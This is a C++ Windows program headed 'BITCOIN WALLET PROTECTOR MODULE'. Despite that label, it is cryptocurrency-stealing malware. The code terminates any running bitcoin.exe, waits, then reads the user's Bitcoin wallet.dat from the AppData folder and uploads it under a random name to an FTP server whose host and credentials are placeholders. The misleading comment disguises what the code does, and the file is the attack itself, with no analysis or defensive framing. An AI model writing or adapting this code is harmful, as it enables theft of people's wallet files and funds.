#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <wininet.h>
#include <ctime>
#include <iostream>
#pragma comment(lib, "wininet")

// BITCOIN WALLET PROTECTOR MODULE

void killprocess()
	{    

		HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0 );		
		PROCESSENTRY32 ProcessEntry = { 0 };					
		ProcessEntry.dwSize = sizeof( ProcessEntry );			
		BOOL Return = FALSE;
		Return = Process32First( hProcessSnapShot,&ProcessEntry );

		int value = _tcsicmp(ProcessEntry.szExeFile, _T("bitcoin.exe"));
		if (value==0) 
			{ 
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID); 
				TerminateProcess(hProcess,0);
				CloseHandle(hProcess); //Close Handle }
		
			}

	while( Process32Next( hProcessSnapShot, &ProcessEntry ));
	CloseHandle( hProcessSnapShot );
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	
	killprocess();
	Sleep(40000);
	srand((unsigned)time(NULL));			
	int seedone=rand();						
    int seedtwo=rand()*3;				
	int seedboth = seedone + seedtwo;		
											
	char randomseed[99];					
    _itoa(seedboth,randomseed,10);			
											
	
	char* appdata = getenv("APPDATA");	
	char* truepath = strcat(appdata, "\\Bitcoin\\wallet.dat"); 

	//ftp
	HINTERNET hInternet;
	HINTERNET hFtpSession;
	hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
	hFtpSession = InternetConnect(hInternet, "FTP HOST", INTERNET_DEFAULT_FTP_PORT, "FTP UN", "FTP PW", INTERNET_SERVICE_FTP, 0, 0);  

	FtpPutFile(hFtpSession, truepath , randomseed , FTP_TRANSFER_TYPE_BINARY, 0);
	FtpPutFile(hFtpSession, truepath, randomseed, FTP_TRANSFER_TYPE_BINARY, 0);

	InternetCloseHandle(hFtpSession);
	InternetCloseHandle(hInternet);
	
	return 0;
}